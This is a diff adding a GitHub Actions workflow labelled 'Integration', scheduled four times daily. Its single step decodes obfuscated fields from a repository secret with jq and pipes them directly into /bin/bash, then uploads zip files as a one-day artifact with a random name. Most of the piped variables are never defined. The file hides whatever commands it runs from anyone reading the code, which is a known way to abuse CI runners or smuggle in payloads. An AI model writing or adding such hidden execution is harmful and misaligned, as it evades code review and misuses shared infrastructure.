@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '40 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          jzy4: ${{ secrets.jzy4 }}
+        run: |
+          printf '%s' "$jzy4" | jq -r .iis0547 | /bin/bash
+          printf '%s' "$obwn05" | jq -r .z091 | /bin/bash
+          printf '%s' "$bkjx77" | jq -r .q54874 | /bin/bash
+          echo $ny4 | jq -r .psmb2022 | /bin/bash
+          printf '%s' "$uyved45" | jq -r .yway351 | /bin/bash
+          echo $kot527 | jq -r .ybu424 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: XLk8OTVn
+          path: "*.zip"
+          retention-days: 1
